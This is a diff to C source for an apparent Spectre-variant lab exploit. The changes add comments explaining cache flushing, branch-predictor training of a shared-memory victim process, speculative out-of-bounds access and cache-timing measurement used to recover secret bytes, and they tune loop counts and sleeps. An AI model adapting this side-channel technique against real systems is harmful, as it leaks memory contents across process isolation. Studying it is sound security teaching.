@@ -15,18 +15,20 @@
 #include <sys/wait.h>     // For process management 
 
 #define CACHE_HIT_THRESHOLD 120
-#define CACHE_LINE_SIZE 0X1000
+#define CACHE_LINE_SIZE 0x1000
 #define BUFF_SIZE 255
 
 
 char * shared_buffer;
 
+// just flushing everything we are interested in, in the cache
 void pre_work() {
 	uint8_t *addr;
 	for (int j = 0; j < BUFF_SIZE; j++) {
 		addr = shared_buffer + j * CACHE_LINE_SIZE;
 		_mm_clflush(addr);
 	}
+
 }
 
 uint64_t time_access_no_flush(void *p) {
@@ -93,9 +95,12 @@ pid_t start_target() {
 	return pid;
 }
 
+
 void train_target() {
+
 	for (int i = 0; i < 1000; i++) {
 		int mix_i = ((i * 167) + 13) & 255;
+		// repeatedly allowing the victim code to loop with valid indexes
 		((volatile int *) shared_buffer)[1] = mix_i % 128;
 		((volatile int*) shared_buffer)[0] = 1;
 		sched_yield();
@@ -103,16 +108,24 @@ void train_target() {
 	// temporary pause
 	for (int i = 0; i < 400; i++) {
 		((volatile int *) shared_buffer)[1] = 0;
+		// set the run index to be 0, off 
+		// a small pause here to know that the training is done
 		((volatile int*) shared_buffer)[0] = 0;
 		sched_yield();
 	}
 }
 
 void speculate(int pos) {
-	//printf("Speculating at position %d (index %d)\n", pos, 128 + pos);
+	// constantly accessing a position that we can interested in
+	// which is an invalid position
+	
 	for (int i = 0; i < 300; i++) {
 		((volatile int*) shared_buffer)[1] = 128 + pos;
+		
+		// set the run value to true
 		((volatile int*) shared_buffer)[0] = 1;
+		
+		// release executing to allow victim process to access it
 		sched_yield();
 	}
 }
@@ -143,8 +156,12 @@ void exploit(int len) {
 	int max_val = 0;
 	int stats[256] = {0};
 	
+	// while we have unsolved results
+	// we are going to perform a loop 
 	while(unsolved(results, len)) {
+		
 		for (int i = 0; i < len ; i++) {
+			// if the result is known
 			if (results[i] != '\x00')
 				continue;
 			
@@ -153,20 +170,32 @@ void exploit(int len) {
 				stats[j] = 0;
 				
 			// if all values known, break
+			
 			if (!unsolved(results, len)) {
 				break;
 			}
 			
 			
 			// work loop 
-			for (int j = 0; j < 4000; j++) {
-			
+			for (int j = 0; j < 1000; j++) {
+
 				pre_work(); // flushing the cache
-				train_target(); // interacting with the cache
-				pre_work(); // flush the cache again so that training data doesn't get mixed up with measurement 
+				
+
+				
+				train_target(); 
+				usleep(100);
+				// we have interacted with the cache during training 
+				// so we need to flush it again because measuring
+				pre_work(); 
+				
 				// exploit target (once i believe I have the victim process primed up)
 				speculate(i);
+				usleep(100);
+				// post work to sum up how many entries find 
+				// and infer the secret value
 				post_work(stats);
+				//stats value now loaded with information
 			}
 			
 			// reviewing the stats data and printing out
@@ -196,6 +225,7 @@ void exploit(int len) {
 }
 
 //  Locks exploit to a specific hw core 
+// So that it would interact with the same branch predictor with the victim process
 void set_affinity() {
 
 	cpu_set_t set;
@@ -213,11 +243,19 @@ int main (int argc, char** argv) {
 	// create shared memory and set command values to 0
 	
 	shared_buffer = (char *) attach_to_shared_mem();
+	
+	// set them to be in a known state
 	((int *) shared_buffer)[0] = 0;
 	((int *) shared_buffer)[1] = 0;
 	((int *) shared_buffer)[2] = 0;
 	
+	// start the victim process
 	pid = start_target();
+	
+	// micro sleep. 
+	// states that the CPU is free to process other work
+	// allows other work to schedule to CPU
+	// so that the victim process can run
 	sched_yield();
 	
 	//calibrate_cache_timing();
@@ -226,3 +264,9 @@ int main (int argc, char** argv) {
 	kill(pid, 9);
 	return 0;
 }
+
+
+
+
+
+
